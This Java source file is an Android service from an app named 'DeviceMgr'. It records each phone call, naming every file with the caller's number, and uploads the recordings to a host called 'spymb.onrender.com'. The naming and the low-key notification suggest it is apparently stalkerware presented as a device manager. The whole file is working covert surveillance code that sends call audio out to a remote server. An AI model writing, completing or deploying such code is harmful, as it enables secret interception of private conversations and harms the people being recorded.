package com.company.devicemgr.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import com.company.devicemgr.utils.HttpClient;

public class CallRecorderService extends Service {
	private static final String TAG = "CallRecorderSvc";
	private static final String CHANNEL_ID = "call_recorder_channel";
	private static final int NOTIF_ID = 2002;
	private static final long MIN_UPLOAD_BYTES = 1024; // threshold only informational now
	
	private TelephonyManager telephonyManager;
	private PhoneStateListener phoneListener;
	private MediaRecorder recorder;
	private File currentFile;
	
	@Override
	public void onCreate() {
		super.onCreate();
		createNotificationChannel();
	}
	
	private void createNotificationChannel() {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Call Recorder", NotificationManager.IMPORTANCE_LOW);
			NotificationManager nm = (NotificationManager) getSystemService(NotificationManager.class);
			if (nm != null) nm.createNotificationChannel(ch);
		}
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// must call startForeground quickly
		Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
		.setContentTitle("DeviceMgr - Call recorder")
		.setContentText("A gravar chamadas (se autorizadas)")
		.setSmallIcon(android.R.drawable.ic_lock_silent_mode)
		.setPriority(NotificationCompat.PRIORITY_LOW)
		.build();
		startForeground(NOTIF_ID, n);
		
		// Check permissions
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
			checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
				Log.i(TAG, "missing RECORD_AUDIO or READ_PHONE_STATE permission");
				stopForeground(true);
				stopSelf();
				return START_NOT_STICKY;
			}
		}
		
		startPhoneListener();
		
		return START_STICKY;
	}
	
	private void startPhoneListener() {
		try {
			telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
			phoneListener = new PhoneStateListener() {
				@Override
				public void onCallStateChanged(int state, String phoneNumber) {
					Log.d(TAG, "call state changed: " + state + " number:" + phoneNumber);
					if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
						// call started -> start recording
						startRecording(phoneNumber);
						} else if (state == TelephonyManager.CALL_STATE_IDLE) {
						// call ended -> stop recording
						stopRecordingAndUpload();
					}
				}
			};
			if (telephonyManager != null) {
				telephonyManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
			}
			} catch (Exception e) {
			Log.e(TAG, "startPhoneListener err", e);
		}
	}
	
	private void startRecording(String number) {
		try {
			// prepare file in app-specific external dir
			File dir = getExternalFilesDir("calls");
			if (dir == null) dir = getFilesDir();
			if (!dir.exists()) dir.mkdirs();
			String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
			String safeNumber = (number != null) ? number.replaceAll("[^0-9]", "") : "";
			String fname = "call_" + ts + (safeNumber.isEmpty() ? "" : ("_" + safeNumber)) + ".m4a";
			currentFile = new File(dir, fname);
			
			recorder = new MediaRecorder();
			// configuration - try multiple audio sources for better device coverage
			boolean sourceSet = false;
			try {
				recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
				sourceSet = true;
				} catch (Throwable t1) {
				Log.w(TAG, "VOICE_CALL not available, trying VOICE_COMMUNICATION", t1);
			}
			if (!sourceSet) {
				try {
					recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
					sourceSet = true;
					} catch (Throwable t2) {
					Log.w(TAG, "VOICE_COMMUNICATION not available, trying VOICE_RECOGNITION", t2);
				}
			}
			if (!sourceSet) {
				try {
					recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
					sourceSet = true;
					} catch (Throwable t3) {
					Log.w(TAG, "VOICE_RECOGNITION not available, falling back to MIC", t3);
				}
			}
			if (!sourceSet) {
				try { recorder.setAudioSource(MediaRecorder.AudioSource.MIC); } catch (Throwable t4) { Log.e(TAG, "no audio source available", t4); }
			}
			
			recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
			recorder.setAudioSamplingRate(16000);
			try { recorder.setAudioChannels(1); } catch (Throwable ignore) {}
			recorder.setOutputFile(currentFile.getAbsolutePath());
			recorder.prepare();
			// slight delay sometimes helps on some devices (uncomment if needed)
			// Thread.sleep(150);
			recorder.start();
			Log.i(TAG, "recording started: " + currentFile.getAbsolutePath());
			} catch (Exception e) {
			Log.e(TAG, "startRecording err", e);
			try { if (recorder != null) { recorder.reset(); recorder.release(); recorder = null; } } catch (Exception ignored) {}
		}
	}
	
	private void stopRecordingAndUpload() {
		try {
			if (recorder != null) {
				try {
					recorder.stop();
					} catch (Exception e) {
					Log.w(TAG, "recorder stop warning", e);
				}
				try { recorder.reset(); recorder.release(); } catch (Exception ignored) {}
				recorder = null;
			}
			
			if (currentFile != null && currentFile.exists()) {
				final File fileToUpload = currentFile;
				// detach immediately to avoid races with other calls
				currentFile = null;
				
				// perform upload in background and only move file after upload finishes
				new Thread(() -> {
					boolean uploaded = false;
					try {
						long size = fileToUpload.length();
						Log.i(TAG, ">>> will upload file: " + fileToUpload.getAbsolutePath() + " size=" + size);
						
						// collect prefs
						SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
						String deviceId = sp.getString("deviceId", "unknown");
						String token = sp.getString("auth_token", null);
						Log.i(TAG, "upload deviceId=" + deviceId + " token?=" + (token != null ? "yes" : "NO"));
						
						// retries with backoff
						int maxAttempts = 3;
						for (int attempt = 1; attempt <= maxAttempts; attempt++) {
							try {
								Log.i(TAG, "upload attempt " + attempt + " for file " + fileToUpload.getName());
								String resp = uploadFileSync(fileToUpload);
								Log.i(TAG, "upload success resp (len=" + (resp != null ? resp.length() : 0) + "): " + (resp != null ? (resp.length() > 200 ? resp.substring(0,200) + "..." : resp) : "null"));
								uploaded = true;
								break;
								} catch (Exception e) {
								Log.e(TAG, "upload attempt " + attempt + " failed: " + e.getMessage(), e);
								if (attempt < maxAttempts) {
									try { Thread.sleep(1000L * (long)Math.pow(2, attempt)); } catch (InterruptedException ie) { /* ignore */ }
								}
							}
						}
						
						if (uploaded) {
							// rename to uploaded_ to avoid retry loops
							try {
								File up = new File(fileToUpload.getParentFile(), "uploaded_" + fileToUpload.getName());
								boolean ok = fileToUpload.renameTo(up);
								Log.i(TAG, "moved uploaded -> " + up.getAbsolutePath() + " ok=" + ok);
								} catch (Exception e) {
								Log.w(TAG, "rename to uploaded_ failed", e);
							}
							} else {
							// move to failed folder for inspection
							try {
								File failedDir = new File(fileToUpload.getParentFile(), "failed");
								if (!failedDir.exists()) failedDir.mkdirs();
								File dest = new File(failedDir, "failed_" + fileToUpload.getName());
								boolean ok = fileToUpload.renameTo(dest);
								Log.i(TAG, "moved failed file to: " + dest.getAbsolutePath() + " ok=" + ok);
								} catch (Exception e) {
								Log.e(TAG, "move failed err", e);
							}
						}
						} catch (Exception e) {
						Log.e(TAG, "uploadFile err (outer)", e);
						// ensure we try to move to failed
						try {
							File failedDir = new File(fileToUpload.getParentFile(), "failed");
							if (!failedDir.exists()) failedDir.mkdirs();
							File dest = new File(failedDir, "failed_" + fileToUpload.getName());
							boolean ok = fileToUpload.renameTo(dest);
							Log.i(TAG, "moved failed file to: " + dest.getAbsolutePath() + " ok=" + ok);
						} catch (Exception ex) { Log.e(TAG, "move failed err2", ex); }
					}
				}).start();
			}
			} catch (Exception e) {
			Log.e(TAG, "stopRecordingAndUpload err", e);
		}
	}
	
	/**
	* Upload síncrono do ficheiro — devolve a resposta do HttpClient (string)
	*/
	private String uploadFileSync(File f) throws Exception {
		SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
		String deviceId = sp.getString("deviceId", "unknown");
		String token = sp.getString("auth_token", null);
		String url = "https://spymb.onrender.com/api/media/" + deviceId + "/upload";
		// HttpClient.uploadFile deve ser síncrono e devolver String (já existente no teu util)
		return HttpClient.uploadFile(url, "media", f, token);
	}
	
	@Override
	public void onDestroy() {
		try {
			if (telephonyManager != null && phoneListener != null) telephonyManager.listen(phoneListener, PhoneStateListener.LISTEN_NONE);
		} catch (Exception ignored) {}
		try { if (recorder != null) { recorder.release(); recorder = null; } } catch (Exception ignored) {}
		try { stopForeground(true); } catch (Exception ignored) {}
		super.onDestroy();
	}
	
	@Override
	public IBinder onBind(Intent intent) { return null; }
}